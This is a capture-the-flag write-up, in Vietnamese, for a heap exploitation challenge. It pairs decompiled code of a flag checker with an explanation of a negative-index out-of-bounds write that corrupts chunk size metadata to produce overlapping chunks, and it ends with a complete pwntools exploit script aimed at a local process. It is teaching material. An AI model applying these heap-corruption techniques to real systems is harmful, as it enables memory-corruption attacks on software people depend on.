# Chal1

nay làm lại bài này để làm quen với pwndbg :))

## ida
```c 
void *getchunk()
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  void *buf; // [rsp+10h] [rbp-20h]
  void *v3; // [rsp+18h] [rbp-18h]
  ssize_t v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("size: ");
  __isoc99_scanf("%lu", &size);
  getchar();
  printf("data: ");
  v3 = malloc(size);
  buf = v3;
  while ( size )
  {
    v4 = read(0, buf, size);
    size -= v4;
    buf = (char *)buf + v4;
  }
  return v3;
}

void __fastcall check(const char *a1)
{
  int fd; // [rsp+14h] [rbp-Ch]
  void *buf; // [rsp+18h] [rbp-8h]

  buf = malloc(0x80uLL);
  fd = open("flag.txt", 0);
  if ( fd < 0 )
    errx(1, "failed to open flag.txt");
  read(fd, buf, 0x80uLL);
  close(fd);
  if ( !strcmp(a1, (const char *)buf) )
  {
    puts("Correct!");
    exit(7);
  }
  printf("%s is not the flag.\n", a1);
  free(buf);
}

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Bh] [rbp-25h]
  int v4; // [rsp+Ch] [rbp-24h] BYREF
  __int64 v5; // [rsp+10h] [rbp-20h]
  void *ptr; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("Welcome to the flag checker");
  v5 = getchunk();
  puts("I'll give you three chances to guess my flag.");
  ptr = (void *)getchunk();
  check(ptr);
  puts("I'll also let you change one character");
  printf("index: ");
  __isoc99_scanf("%d", &v4);
  getchar();
  printf("new character: ");
  v3 = getchar();
  getchar();
  *((_BYTE *)ptr + v4) = v3;
  check(ptr);
  free(ptr);
  puts("Last chance to guess my flag");
  v7 = getchunk();
  check(v7);
  exit(0);
}
```

- đọc sơ qua thì hiểu đơn giản là nhập vào flag, nó sẽ check xem có đúng là flag không, quan trong là mình có biết flag là gì đâu mà nhập :)) 
- để ý thì bài có 2 bug lớn tại đoạn này:
```c
puts("I'll also let you change one character");
printf("index: ");
__isoc99_scanf("%d", &v4);
getchar();
printf("new character: ");
v3 = getchar();
```
- tại đây nó cho phép thay đổi 1 kí tự trong flag mà ta nhập vào, vậy nếu ta nhập số âm thì ta hoàn toàn có thể thay đổi heapmeta data => **lỗi OOB**
- nếu ta thay đổi size của chunk thành 1 size khác lớn hơn, sau khi free và malloc lại, ta có thể thay đổi content của chunk khác => **lỗi Overlapping Chunk**


## Exploit

- ở lần nhập 1 và 2 không có gì quan trọng nên ta nhập đại 1 chunk có size nhỏ 

```python
create(b"8", b"a" * 8)
create(b"16", b"a" * 16)
```
- tiếp theo lợi dụng lỗi OOB để thay đổi pre size của chunk ta vừa khởi tạo từ 0x21 thành 0x31

```python
change(b"-8", p8(0x31))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/fdf421ee-8692-4d44-b21d-d0e63c9de588)

- sau đó chương trình sẽ free cái chunk này và nhầm nó có size 0x31

![image](https://github.com/gookoosss/CTF/assets/128712571/53fd8ab8-82c0-4cb2-9307-f85f0779af56)


- malloc 1 chunk size 0x20 để lấy lại chunk vừa free, lúc này ta có thể ghi đè lên 0x55717c7e32f0 là heap metadate của  chunk 0x90 và leak flag

![image](https://github.com/gookoosss/CTF/assets/128712571/0f5c644c-5ae5-488e-ac41-99551f0b3905)


## script 

```python 
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+300
                b*main+237
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 5000)
else:
        p = process(exe.path)

GDB()
def create(size, data):
        sla(b"size: ", size)
        sa(b"data: ", data )
def change(index, data):
        sla(b"index: ", index)
        sla(b"character: ", data)

create(b"8", b"a" * 8)
create(b"16", b"a" * 16)
change(b"-8", p8(0x31))
create(b"32", b"a" * 32)


p.interactive()


```



